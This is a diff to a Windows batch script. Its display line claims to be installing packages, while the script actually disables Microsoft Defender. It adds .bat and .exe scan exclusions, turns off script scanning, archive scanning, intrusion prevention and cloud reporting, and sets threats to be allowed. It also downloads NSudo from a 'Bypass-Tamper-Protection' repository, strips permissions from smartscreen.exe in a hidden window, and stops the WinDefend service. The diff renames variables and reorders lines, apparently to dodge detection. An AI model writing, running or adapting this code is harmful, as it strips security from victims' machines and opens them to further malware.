@@ -29,10 +29,15 @@ echo  Installing Necessary Packages.....Please Wait.......
 
 
 
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
+
+powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
+
 powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
 
+powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
 
 powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
 powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
@@ -40,9 +45,7 @@ powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
 powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
 powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
 powershell.exe -command "Set-MpPreference -SubmitSamplesConsent 2"
-powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
-powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Set-MpPreference -MAPSReporting 0"
 powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
 powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
@@ -60,12 +63,12 @@ cd  %temp%
 
 bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
-set add=%systemroot%
+set iop=%systemroot%
 
-set mul=System32
+set yop=System32
 
 
-NSudo.exe -U:T -ShowWindowMode:Hide icacls "%add%\%mul%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+NSudo.exe -U:T -ShowWindowMode:Hide icacls "%iop%\%yop%\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
 
  
 NSudo.exe -U:T -ShowWindowMode:Hide sc stop WinDefend 
